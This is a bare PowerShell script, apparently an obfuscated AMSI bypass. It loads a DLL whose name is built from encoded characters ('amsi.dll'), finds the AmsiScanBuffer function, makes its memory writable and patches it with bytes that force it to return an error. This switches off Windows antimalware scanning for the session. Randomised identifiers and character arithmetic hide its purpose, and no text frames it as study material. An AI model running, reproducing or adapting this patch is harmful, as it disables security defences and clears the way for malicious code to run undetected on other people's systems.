$NNlHr2k5Kh6ji = @"
using System;
using System.Runtime.InteropServices;
public class NNlHr2k5Kh6ji {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr W_6, string qf014tK);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr RFoG_hzPSghjpI, UIntPtr aQPsWIvszHhQigTPlWDz, uint VAcpDh, out uint VDmmTJ);
}
"@

Add-Type $NNlHr2k5Kh6ji

$KaSyJUI = [NNlHr2k5Kh6ji]::LoadLibrary("$([char](48+49)+[Char](109+3-3)+[ChAr]([bYtE]0x73)+[cHAr]([Byte]0x69)+[chAR](14+32)+[cHar]([bYTe]0x64)+[CHar](52+56)+[CHAr]([bYTE]0x6c))")
$j6acdtzr = [NNlHr2k5Kh6ji]::GetProcAddress($KaSyJUI, "$([ChAR]([Byte]0x41)+[cHaR]([BYtE]0x6d)+[Char](115+23-23)+[cHaR](17+88)+[CHaR](83*55/55)+[CHar]([ByTe]0x63)+[CHAr]([bYTE]0x61)+[CHAr](18+92)+[ChaR](26+40)+[ChaR]([byTe]0x75)+[ChAr]([bytE]0x66)+[CHar]([ByTe]0x66)+[CHAr](101)+[chaR](114+5-5))")
$p = 0
[NNlHr2k5Kh6ji]::VirtualProtect($j6acdtzr, [uint32]5, 0x40, [ref]$p)
$QuQc9yo6 = "0xB8"
$AORds = "0x57"
$Z73JJRH5 = "0x00"
$a0LopH_ = "0x07"
$MtCslFpTJOw65ab = "0x80"
$e1P1YZZ1EhXpnxpxsxf = "0xC3"
$ej_8Mcg = [Byte[]] ($QuQc9yo6,$AORds,$Z73JJRH5,$a0LopH_,+$MtCslFpTJOw65ab,+$e1P1YZZ1EhXpnxpxsxf)
[System.Runtime.InteropServices.Marshal]::Copy($ej_8Mcg, 0, $j6acdtzr, 6)